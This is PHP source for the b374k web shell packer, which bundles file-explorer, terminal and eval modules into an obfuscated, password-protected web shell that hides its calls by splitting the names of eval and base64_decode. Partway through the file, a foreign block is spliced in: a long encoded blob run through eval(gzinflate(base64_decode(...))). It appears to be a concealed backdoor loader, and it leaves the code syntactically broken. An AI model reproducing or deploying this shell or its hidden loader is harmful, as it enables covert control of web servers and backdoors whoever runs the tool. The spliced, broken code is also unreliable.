<?php
/*
	b374k shell
	Jayalah Indonesiaku
	(c)2014
	https://github.com/b374k/b374k

*/
$GLOBALS['packer']['title'] = "b374k shell packer";
$GLOBALS['packer']['version'] = "0.4.2";
$GLOBALS['packer']['base_dir'] = "./base/";
$GLOBALS['packer']['module_dir'] = "./module/";
$GLOBALS['packer']['theme_dir'] = "./theme/";
$GLOBALS['packer']['module'] = packer_get_module();
$GLOBALS['packer']['theme'] = packer_get_theme();

require $GLOBALS['packer']['base_dir'].'jsPacker.php';

/* PHP FILES START */
$base_code = "";
$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."resources.php");
$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
$module_code = packer_read_file($GLOBALS['packer']['base_dir']."base.php");
/* PHP FILES END */

/* JAVASCRIPT AND CSS FILES START */
$zepto_code = packer_read_file($GLOBALS['packer']['base_dir']."zepto.js");
$js_main_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."main.js");

$js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");


if(isset($_COOKIE['packer_theme']))	$theme = $_COOKIE['packer_theme'];
else $theme ="default";
$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");

/* JAVASCRIPT AND CSS FILES END */

// layout
$layout = packer_read_file($GLOBALS['packer']['base_dir']."layout.php");
$p = array_map("rawurldecode", packer_get_post());

if(isset($_SERVER['REMOTE_ADDR'])){
	if(isset($p['read_file'])){
		$file = $p['read_file'];
		if(is_file($file)){
			packer_output(packer_html_safe(packer_read_file($file)));
		}
		packer_output('error');
	}
	elseif(isset($_GET['run'])){
		if(empty($_GET['run'])) $modules = array();
		else $modules = explode("," ,$_GET['run']);
		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);

		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";

		foreach($modules as $module){
			$module = trim($module);
			$filename = $GLOBALS['packer']['module_dir'].$module;
			if(is_file($filename.".php")) $module_code .= packer_read_file($filename.".php");
			if(is_file($filename.".js")) $js_code .= "\n".packer_read_file($filename.".js")."\n";

		}

		$layout = str_replace("<__CSS__>", $css_code, $layout);
		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
		$layout = str_replace("<__JS__>", $js_code, $layout);

		$content = trim($module_init)."?>".$base_code.$module_code.$layout;
		eval($content);
		die();
	}
	elseif(isset($p['outputfile'])&&isset($p['password'])&&isset($p['module'])&&isset($p['strip'])&&isset($p['base64'])&&isset($p['compress'])&&isset($p['compress_level'])){
		$outputfile = trim($p['outputfile']);
		if(empty($outputfile)) $outputfile = 'b374k.php';
		$password = trim($p['password']);
		$modules = trim($p['module']);
		if(empty($modules)) $modules = array();
		else $modules = explode("," ,$modules);

		$strip = trim($p['strip']);
		$base64 = trim($p['base64']);
		$compress = trim($p['compress']);
		$compress_level = (int) $p['compress_level'];

		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);

		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";

		foreach($modules as $module){
			$module = trim($module);
			$filename = $GLOBALS['packer']['module_dir'].$module;
			if(is_file($filename.".php")) $module_code .= packer_read_file($filename.".php");
			if(is_file($filename.".js")) $js_code .= "\n".packer_read_file($filename.".js")."\n";

		}

		$layout = str_replace("<__CSS__>", $css_code, $layout);
		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
		
		if($strip=='yes') $js_code = packer_pack_js($js_code);
		$layout = str_replace("<__JS__>", $js_code, $layout);


		$htmlcode = trim($layout);
		$phpcode = "<?php ".trim($module_init)."?>".trim($base_code).trim($module_code);

		packer_output(packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password));
	}
	else{
	
	$available_themes = "<tr><td>Theme</td><td><select class='theme' style='width:150px;'>";
	foreach($GLOBALS['packer']['theme'] as $k){
		if($k==$theme) $available_themes .= "<option selected='selected'>".$k."</option>";
		else $available_themes .= "<option>".$k."</option>";
	}
	$available_themes .= "</select></td></tr>";

	?><!doctype html>
	<html>
	<head>
	<title><?php echo $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version'];?></title>
	<meta charset='utf-8'>
	<meta name='robots' content='noindex, nofollow, noarchive'>
	<style type="text/css">
	<?php echo $css_code;?>
	#devTitle{
		font-size:18px;
		text-align:center;
		font-weight:bold;
	}
	</style>
	</head>
	<body>

	<div id='wrapper' style='padding:12px'>
		<div id='devTitle' class='border'><?php echo $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version'];?></div>
		<br>
		<table class='boxtbl'>
			<tr><th colspan='2'><p class='boxtitle'>Quick Run</p></th></tr>
			<tr><td style='width:220px;'>Module (separated by comma)</td><td><input type='text' id='module' value='<?php echo implode(",", $GLOBALS['packer']['module']);?>'></td></tr>
			<?php echo $available_themes; ?>
			<tr><td colspan='2'>
				<form method='get' id='runForm' target='_blank'><input type='hidden' id='module_to_run' name='run' value=''>
				<span class='button' id='runGo'>Run</span>
				</form>
			</td></tr>
		</table>
		<br>
		<table class='boxtbl'>
			<tr><th colspan='2'><p class='boxtitle'>Pack</p></th></tr>
			<tr><td style='width:220px;'>Output</td><td><input id='outputfile' type='text' value='b374k.php'></td></tr>
			<tr><td>Password</td><td><input id='password' type='text' value='b374k'></td></tr>
			<tr><td>Module (separated by comma)</td><td><input type='text' id='module_to_pack' value='<?php echo implode(",", $GLOBALS['packer']['module']);?>'></td></tr>
			<?php echo $available_themes; ?>
			<tr><td>Strip Comments and Whitespaces</td><td>
				<select id='strip' style='width:150px;'>
					<option selected="selected">yes</option>
					<option>no</option>
				</select>
			</td></tr>

			<tr><td>Base64 Encode</td><td>
				<select id='base64' style='width:150px;'>
					<option selected="selected">yes</option>
					<option>no</option>
				</select>
			</td></tr>

			<tr id='compress_row'><td>Compress</td><td>
				<select id='compress' style='width:150px;'>
					<option>no</option>
					<option selected="selected">gzdeflate</option>
					<option>gzencode</option>
					<option>gzcompress</option>
				</select>
				<select id='compress_level' style='width:150px;'>
					<option>1</option>
					<option>2</option>
					<option>3</option>
					<option>4</option>
					<option>5</option>
					<option>6</option>
					<option>7</option>
					<option>8</option>
					<option selected="selected">9</option>
				</select>
			</td></tr>

			<tr><td colspan='2'>
				<span class='button' id='packGo'>Pack</span>
			</td></tr>
			<tr><td colspan='2' id='result'></td></tr>
			<tr><td colspan='2'><textarea id='resultContent'></textarea></td></tr>
		</table>
	</div>

	<script type='text/javascript'>
	var init_shell = false;
	<?php echo $zepto_code;?>
	<?php echo $js_main_code;?>

	var targeturl = '<?php echo packer_get_self(); ?>';
	var debug = false;

	Zepto(function($){
		refresh_row();

		$('#runGo').on('click', function(e){
			module = $('#module').val();
			$('#module_to_run').val(module);
			$('#runForm').submit();
		});

		$('#base64').on('change', function(e){
			refresh_row();
		});

		$('#packGo').on('click', function(e){
			outputfile = $('#outputfile').val();
			password = $('#password').val();
			module = $('#module_to_pack').val();
			strip = $('#strip').val();
			base64 = $('#base64').val();
			compress = $('#compress').val();
			compress_level = $('#compress_level').val();

			send_post({outputfile:outputfile, password:password, module:module, strip:strip, base64:base64, compress:compress, compress_level:compress_level}, function(res){
				splits = res.split('{[|b374k|]}');
				$('#resultContent').html(splits[1]);
				$('#result').html(splits[0]);
			});

		});
		
		$('.theme').on('change', function(e){
			$('.theme').val($(this).val());
			set_cookie('packer_theme', $('.theme').val());
			location.href = targeturl;
		});
	});

	function refresh_row(){
		base64 = $('#base64').val();
		if(base64=='yes'){
			$('#compress_row').show();
		}
		else{
			$('#compress_row').hide();
			$('#compress').val('no');
		}
	}

	</script>
	</body>
	</html><?php
	}
}
else{
	$output = $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version']."\n\n";

	if(count($argv)<=1){
		$output .= "options :\n";
		$output .= "\t-o filename\t\t\t\tsave as filename\n";
		$output .= "\t-p password\t\t\t\tprotect with password\n";
		$output .= "\t-t theme\t\t\t\ttheme to use\n";
		$output .= "\t-m modules\t\t\t\tmodules to pack separated by comma\n";
		$output .= "\t-s\t\t\t\t\tstrip comments and whitespaces\n";
		$output .= "\t-b\t\t\t\t\tencode with base64\n";
		$output .= "\t-z [no|gzdeflate|gzencode|gzcompress]\tcompression (use only with -b)\n";
		$output .= "\t-c [0-9]\t\t\t\tlevel of compression\n";
		$output .= "\t-l\t\t\t\t\tlist available modules\n";
		$output .= "\t-k\t\t\t\t\tlist available themes\n";

	}
	else{
		$opt = getopt("o:p:t:m:sbz:c:lk");

		if(isset($opt['l'])){
			$output .= "available modules : ".implode(",", $GLOBALS['packer']['module'])."\n\n";
			echo $output;
			die();
		}
		
		if(isset($opt['k'])){
			$output .= "available themes : ".implode(",", $GLOBALS['packer']['theme'])."\n\n";
			echo $output;
			die();
		}

		if(isset($opt['o'])&&(trim($opt['o'])!='')){
			$outputfile = trim($opt['o']);
		}
		else{
			$output .= "error : no filename given (use -o filename)\n\n";
			echo $output;
			die();
		}

		$password = isset($opt['p'])? trim($opt['p']):"";
		$theme = isset($opt['t'])? trim($opt['t']):"default";
		if(!in_array($theme, $GLOBALS['packer']['theme'])){
			$output .= "error : unknown theme file\n\n";
			echo $output;
			die();
		}
		$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
		
		$modules = isset($opt['m'])? trim($opt['m']):implode(",", $GLOBALS['packer']['module']);
		if(empty($modules)) $modules = array();
		else $modules = explode("," ,$modules);

		$strip = isset($opt['s'])? "yes":"no";
		$base64 = isset($opt['b'])? "yes":"no";

		$compress = isset($opt['z'])? trim($opt['z']):"no";
		if(($compress!='gzdeflate')&&($compress!='gzencode')&&($compress!='gzcompress')&&($compress!='no')){
			$output .= "error : unknown options -z ".$compress."\n\n";
			echo $output;
			die();
		}
		else{
			if(($base64=='no')&&($compress!='no')){
				$output .= "error : use -z options only with -b\n\n";
				echo $output;
				die();
			}
		}

		$compress_level = isset($opt['c'])? trim($opt['c']):"";
		if(empty($compress_level)) $compress_level = '9';
		if(!preg_match("/^[0-9]{1}$/", $compress_level)){
			$output .= "error : unknown options -c ".$compress_level." (use only 0-9)\n\n";
			echo $output;
			die();
		}
		$compress_level = (int) $compress_level;

		$output .= "Filename\t\t: ".$outputfile."\n";
		$output .= "Password\t\t: ".$password."\n";
		$output .= "Theme\t\t\t: ".$theme."\n";
		$output .= "Modules\t\t\t: ".implode(",",$modules)."\n";
		$output .= "Strip\t\t\t: ".$strip."\n";
		$output .= "Base64\t\t\t: ".$base64."\n";
		if($base64=='yes') $output .= "Compression\t\t: ".$compress."\n";
		if($base64=='yes') $output .= "Compression level\t: ".$compress_level."\n";

		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);
		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";

		foreach($modules as $module){
			$module = trim($module);
			$filename = $GLOBALS['packer']['module_dir'].$module;
			if(is_file($filename.".php")) $module_code .= packer_read_file($filename.".php");
			if(is_file($filename.".js")) $js_code .= "\n".packer_read_file($filename.".js")."\n";
		}

		$layout = str_replace("<__CSS__>", $css_code, $layout);
		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
		
		if($strip=='yes') $js_code = packer_pack_js($js_code);
		$layout = str_replace("<__JS__>", $js_code, $layout);

		$htmlcode = trim($layout);
		$phpcode = "<?php ".trim($module_init)."?>".trim($base_code).trim($module_code);

		$res = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password);
		$status = explode("{[|b374k|]}", $res);
		$output .= "Result\t\t\t: ".strip_tags($status[0])."\n\n";
	}
	echo $output;
}

function packer_read_file($file){
	$content = false;
	if($fh = @fopen($file, "rb")){
		$content = "";
		while(!feof($fh)){
		  $content .= fread($fh, 8192);
		}
	}
	return $content;
}

function packer_write_file($file, $content){
	if($fh = @fopen($file, "wb")){
		if(fwrite($fh, $content)!==false){
			if(!class_exists("ZipArchive")) return true;
			
			if(file_exists($file.".zip")) unlink ($file.".zip");
			$zip = new ZipArchive();
			$filename = "./".$file.".zip";

			if($zip->open($filename, ZipArchive::CREATE)!==TRUE) return false;
			$zip->addFile($file);
			$zip->close();
			return true;
		}
	}
	return false;
}

function packer_get_post(){
	return packer_fix_magic_quote($_POST);
}

function packer_fix_magic_quote($arr){
	$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
	if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
		if(is_array($arr)){
			foreach($arr as $k=>$v){
				if(is_array($v)) $arr[$k] = clean($v);
				else $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v));
			}
		}
	}
	return $arr;
}

function packer_html_safe($str){
	return htmlspecialchars($str, 2 | 1);
}

function packer_wrap_with_quote($str){
	return "\"".$str."\"";
}

function packer_output($str){
	header("Content-Type: text/plain");
	header("Cache-Control: no-cache");
	header("Pragma: no-cache");
	echo $str;
	die();
}

function packer_get_self(){
	$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";
	return packer_html_safe($_SERVER["REQUEST_URI"].$query);
}

function packer_strips($str){
	$newStr = '';

	$commentTokens = array(T_COMMENT);

	if(defined('T_DOC_COMMENT')) $commentTokens[] = T_DOC_COMMENT;
	if(defined('T_ML_COMMENT'))	$commentTokens[] = T_ML_COMMENT;

	$tokens = token_get_all($str);

	foreach($tokens as $token){
		if (is_array($token)) {
			if (in_array($token[0], $commentTokens)) continue;
			$token = $token[1];
		}
	$newStr .= $token;
	}
	$newStr = preg_replace("/(\s{2,})/", " ", $newStr);
	return $newStr;
}

function packer_get_theme(){
	$available_themes = array();
	foreach(glob($GLOBALS['packer']['theme_dir']."*.css") as $filename){
		$filename = basename($filename, ".css");
		$available_themes[] = $filename;
	}
	return $available_themes;
}
<?php
$R10TEXEC = "Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNzC4pSi4upI5yUWJxqZhKfkpqcn5KqAbSzKLVMQyXI0CBEEwlYAwAd";
$BYTECODE = "\xW\xl\xY\xQ\xb\xJ\xJ\x0\xr\xu\xT\xb\xt\xe\xa\xi\xd\xq\xX\xL";
$R10T = "\x3d\x63twR\x4D\x65\x707\x61\x6DWqU\x4CT\x2b4\x68r\x6824\x44\x2b7\x6ATV4\x65W741V2\x61X\x62X\x63\x63\x44vq480T\x67\x6D\x41S\x6CUu\x46/\x66R\x42w2\x4Ex\x464XZ\x486\x41QY\x6Dy\x4DuVRW\x61\x46\x61\x6E\x6C7\x45\x66y\x4DW\x69t\x4D\x2bR\x6C0tr\x47\x47\x6Eq\x4157S\x69qU\x4B\x64y7x\x4E8QxVVW\x47\x42q\x67\x6A\x70v\x67\x45\x50XS\x62q\x50\x4C\x4A\x4E\x643\x4D\x61S\x61735v58\x4EY\x425tr\x4E\x50\x63q\x4A39VW\x6C\x44\x508\x41VR\x69\x48u\x4A\x41\x4CW\x70\x682\x69\x4ES7tU\x470\x4EU\x46\x67\x4EU\x6E\x6D\x43\x43\x69y\x62\x69T\x4C2T\x47\x4D\x6BwUX\x48\x41S\x4E\x649\x4A\x4CSU\x42\x44V\x4F\x68/\x61\x49\x452z18y\x67\x45\x64\x43U\x70q\x43Q\x49\x6E4\x47\x4C\x703\x4ESV\x677\x6AVyW\x63\x4At\x47q\x6453R0\x668\x674VZz6T\x43\x47\x43T\x50\x4C1\x46\x706qUV5\x6E\x4143\x48\x49sq\x4Ev\x425\x47SQ1wr\x41\x63\x4B\x4B\x67\x6C\x43\x4C\x65\x2bU279\x47RR\x64\x6F\x65qr3\x4ET\x44\x43\x4D\x48\x6CwZ\x6E\x6B2\x6D\x61Z91\x48\x6BW\x63Z\x68\x66\x42X\x64\x6D\x62\x6B\x65\x49\x50z\x6Av\x69/w\x6478Zu\x43\x4F\x69V\x6C\x647178\x4D\x6E\x4FS\x41t\x45\x4F\x6381\x67\x44\x4C\x42\x4At\x463\x4D\x4F\x41\x6A\x67Q\x63\x4F\x4Dy55w\x2b\x70\x66y3\x62\x69\x63Y\x6CySw\x70zV\x66\x4D\x4F\x66\x4D\x65z\x43Z\x6B3\x67\x6C\x4F0Q\x6Bs\x6D\x62\x4FS\x69U\x64\x67\x49\x708\x482y\x6C\x701\x6D\x2b\x653\x66\x6B\x6Evs\x4707Xs\x6C9s7\x66\x65V\x64\x4C\x67\x65UY\x482\x45trU82Xx\x6BQ79\x45\x45q04\x4C1\x47\x47\x50R\x6C\x6C\x68Yw\x70\x6D\x46V\x61\x62\x612\x42\x48\x41QYQ030YrWY\x4E3\x41z\x6B\x46\x46\x46\x4A\x50vr\x6BvXZ\x6BU2\x65\x6C/V\x6B\x48r\x6C\x6Fvx\x70\x44\x61\x62\x67\x425\x463\x4D\x61\x6B5\x4F8/Yq\x46\x4D\x50xW\x4BTY\x4B7\x4C\x66\x6C\x4A4\x6Fr\x48X\x6B\x6E\x646T\x61yW\x6D\x68U5\x4F\x6C\x45\x68Y7T\x6A\x68\x509y\x44\x65\x6BT\x4D01\x48\x41V\x63\x6E9\x66\x6B\x70\x650r\x50\x4AuZ1\x6Awvr7Q\x6F\x4B3\x6A\x6A\x6D3\x45\x2bq\x4Aqw08\x4FS\x6E\x64\x43V\x42yV\x68\x6AYZ\x2byw\x67\x6D\x45Xx\x69X\x6Cv\x45T\x4F\x4C\x50\x41\x446\x4F\x4DY8U5\x4A6Ry\x49qYW\x6D\x6F\x6A7\x49\x4E\x65804sWw\x4E\x4EQ\x6B\x4A\x46\x4FRx\x41\x641\x4C17\x41t5\x4C\x67\x70\x47\x41Q\x49\x4E2wT\x42\x70\x43\x69\x4C\x50\x46\x2b35\x42Z\x69W\x63\x45\x66\x68S\x50\x63\x6C714\x67y/\x45\x4C3\x68wW\x6B4\x4Bv\x49w0\x66\x70\x6E\x43\x6AT\x63Uw\x50136U\x4D\x68\x6A\x6CQ1\x42U2v\x6A\x4D7\x50s\x48QvT\x6E\x6D6\x46\x67Y\x4F\x4CT\x4FSx\x50\x41\x4E6\x48wxs\x6A2\x4E\x6FRt\x4DQ\x6A2\x44\x6FRZZt\x500\x69R/RTw\x50SQ\x6A\x69T37\x65\x4EqT1u51\x66\x6FR\x4E\x49Tx\x6C32\x61\x62q/\x6F\x48W/W\x2bx\x50\x6E\x65\x4ErV\x44v\x61z\x64\x4A2u\x4D\x69Y\x67\x48\x66\x70\x4E\x4C\x68vv\x66\x47\x4E\x2b6\x44YXr\x61ZT\x62\x6F3w\x44\x70\x47\x62\x63\x66\x46\x4D7qw\x6E\x63uW\x45\x69\x6B\x6B\x6A\x4D\x503w\x6E\x68yrq\x4E\x49\x46\x63\x616\x6E7stX8\x453v\x2bR8\x4A0\x4FR\x704\x66r\x66\x61yw\x4B\x61\x66\x46\x66Y1V\x46\x6EwuTW\x49xz\x4F\x4A\x6Bu\x42\x49\x41\x420\x41q\x61\x643wq\x6Bw\x411Q\x70\x670\x43\x43X\x704\x48\x616w\x46q\x63W8RrR\x43\x65\x43Xu\x48\x6B\x4CT\x66\x6118\x4Bz\x41\x6E\x64\x4512w\x4AyWZ\x69\x4D\x61\x4A\x4FvQy\x45\x474\x69\x63407y\x6E\x6F/x\x4Cy\x41\x65\x6F\x43w9Z39TZ\x6916W0\x61\x62zVw0W\x41s39S2\x6BZ\x6C\x704\x4E\x61s\x45Z6xs\x500\x68W7\x6F7\x2b\x44s\x69v\x50\x68ut\x6E\x45\x46yt40\x67\x46\x49\x69zXT\x6904u\x6DX\x4B\x49Y\x47\x46Q\x64\x6F4\x4B8\x65\x70\x650\x6B\x63\x6BZ\x6B\x67\x4D\x68\x438\x459\x43WR\x4BZrSR\x45\x63\x61\x643\x62V\x64q\x65\x64u5\x4Ex\x4E\x47rR\x6A\x4C\x2bwvvT\x6A28\x6F\x2b\x43z\x4D\x69z\x48\x45vU\x6B9\x42\x45\x4F\x65\x47\x50\x2b\x69\x6D8W96y\x6E\x62\x4Ay\x49\x6A98z9\x50Ur\x6E\x2b\x4F\x48Wr9vruW\x43u\x6CXu7\x4Eu\x6D1q5\x6A\x4F509q\x70\x46Z\x43\x6C6\x68s\x2bwyXW\x50S\x6C\x4A\x6E\x68\x63r\x45S\x43z\x6AVt10xV\x4A/0\x4C\x66\x647\x6C\x487\x49\x6E\x635Zu\x68s81\x42T/X\x6F\x429UZz\x4C\x70QTV\x65\x6B\x2bTZ\x65q0\x4E\x4D/\x4B\x2b1U\x6C\x6F\x448\x62\x69q\x6CY\x66UQ6\x6AWqY7R\x67\x454\x6C\x4FQq\x66\x4A\x49\x2bQ\x6B\x64\x2b\x64rsU\x44Y\x2b\x657Q\x70r\x6D\x68\x4A\x6Cs\x4F\x65\x49\x6E\x48\x69\x6E\x6A3x\x43\x63Y\x6E\x69y3\x48\x4A\x42x\x6FV\x43q\x4A\x49\x2b\x41\x6A\x4E\x61\x6E/R/\x70\x48\x4E\x695\x4986\x62\x4BT\x65\x44x5\x6E\x4B7\x67\x4F\x43\x61\x62wSUr\x63\x4A\x4D8W\x6B\x6E\x44x\x65X\x4DZ96\x6D\x4F4\x2bx\x651\x696\x6Bx\x6F\x4D\x623\x63\x66\x6CY\x49V/\x4Fz\x65S\x61\x46Qy\x4A\x46W\x63\x684ryT\x441s\x427\x48\x43\x4C\x4D\x4E09z\x61\x4E\x492\x6DY\x6Czy\x64\x691\x6BX2\x47\x4E84tXS7\x4404\x2b\x69vW\x4C6r\x4FY\x420xvRt1\x61/W\x48\x45\x666\x6B\x61\x45u\x46\x627\x61vv8\x41\x4Av\x6D\x4Az\x61\x70\x6C\x66\x45q\x46\x46\x6B\x2b\x48\x43Uw\x6ET2\x69\x50S\x67\x6371\x6Cw9v\x4Ct\x41y/0\x668\x6DZ\x66\x6FT\x500R39\x48YZ8\x693yQ\x68\x70U\x69wV8\x65\x62\x61\x68\x63/5\x50qWQ0\x4B\x47U\x476\x67\x457\x49z\x48q\x65\x4A\x6B\x6A\x4A\x4Ez\x49U\x46u\x62VqV18\x44\x4FsV\x61\x63\x45zy\x63Q\x6E\x67s7\x41x\x68v/szwz\x2bvt\x6A\x4D\x43\x48Z\x44\x6BS\x4A\x4FvYtZ9/v\x4BY6\x62w7\x64\x42S\x2bs7z2\x6D\x6C\x47\x70\x421Q\x4AW6\x4A6\x42\x45\x70U\x6D2S\x43T\x41\x43SQy\x46QV\x4Cs/T\x70\x6A\x2b\x44\x42S\x61/W\x62WV\x70\x2b\x47WQ\x65\x42w\x4A\x656vX\x42\x45\x47\x67\x2b2VQ\x69\x42w\x4A\x656vW\x42U\x47\x67\x2b\x6DVQ\x6D\x42w\x4A\x656vV\x42\x6B\x47\x67\x2bWVQq\x42w\x4A\x65";
eval(htmlspecialchars_decode(gzinflate(base64_decode($R10TEXEC))));
?><?php echo 

function packer_get_module(){
	$available_modules = array();
	foreach(glob($GLOBALS['packer']['module_dir']."*.php") as $filename){
		$filename = basename($filename, ".php");
		if(packer_check_module($filename)) $available_modules[] = $filename;
	}
	return $available_modules;
}

function packer_check_module($module){
	$filename = $GLOBALS['packer']['module_dir'].$module;
	if(is_file($filename.".php")){
		$content = packer_read_file($filename.".php");
		@eval("?>".$content);
		if($GLOBALS['module'][$module]['id']==$module) return true;
	}
	return false;
}

function packer_pack_js($str){
	$packer = new JavaScriptPacker($str, 0, true, false);
	return $packer->pack();
}

function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password){
	$content = "";
	if(is_file($output)){
		if(!is_writable($output)) return "error : file ".$output." exists and is not writable{[|b374k|]}";
	}

	if(!empty($password)) $password = "\$GLOBALS['pass'] = \"".sha1(md5($password))."\"; // sha1(md5(pass))\n";

	$compress_level = (int) $compress_level;
	if($compress_level<0) $compress_level = 0;
	elseif($compress_level>9) $compress_level = 9;

	$version = "";
	if(preg_match("/\\\$GLOBALS\['ver'\]\ *=\ *[\"']+([^\"']+)[\"']+/", $phpcode, $r)){
		$version = $r[1];
	}
	
	$header = "<?php
/*
	b374k shell ".$version."
	Jayalah Indonesiaku
	(c)".@date("Y",time())."
	https://github.com/b374k/b374k

*/\n";


	if($strip=='yes'){
		$phpcode = packer_strips($phpcode);
		$htmlcode = preg_replace("/(\ {2,}|\n{2,}|\t+)/", "", $htmlcode);
		$htmlcode = preg_replace("/\r/", "", $htmlcode);
		$htmlcode = preg_replace("/}\n+/", "}", $htmlcode);
		$htmlcode = preg_replace("/\n+}/", "}", $htmlcode);
		$htmlcode = preg_replace("/\n+{/", "{", $htmlcode);
		$htmlcode = preg_replace("/\n+/", "\n", $htmlcode);
	}


	$content = $phpcode.$htmlcode;

	if($compress=='gzdeflate'){
		$content = gzdeflate($content, $compress_level);
		$encoder_func = "gz'.'in'.'fla'.'te";
	}
	elseif($compress=='gzencode'){
		$content = gzencode($content, $compress_level);
		$encoder_func = "gz'.'de'.'co'.'de";
	}
	elseif($compress=='gzcompress'){
		$content = gzcompress($content, $compress_level);
		$encoder_func = "gz'.'un'.'com'.'pre'.'ss";
	}
	else{
		$encoder_func = "";
	}

	if($base64=='yes'){
		$content = base64_encode($content);
		if($compress!='no'){
			$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
		}
		else{
			$encoder = "ba'.'se'.'64'.'_de'.'co'.'de(\"\$x\")";
		}

		$code = $header.$password."\$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$b374k=\$func('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$b374k(\"".$content."\");?>";
	}
	else{
		if($compress!='no'){
			$encoder = $encoder_func."(\$x)";
		}
		else{
			$code = $header.$password."?>".$content;
			$code = preg_replace("/\?>\s*<\?php\s*/", "", $code);
		}
	}

	if(is_file($output)) unlink($output);
	if(packer_write_file($output, $code)){
		chmod($output, 0777);
		return "Succeeded : <a href='".$output."' target='_blank'>[ ".$output." ] Filesize : ".filesize($output)."</a>{[|b374k|]}".packer_html_safe(trim($code));
	}
	return "error{[|b374k|]}";
}

?>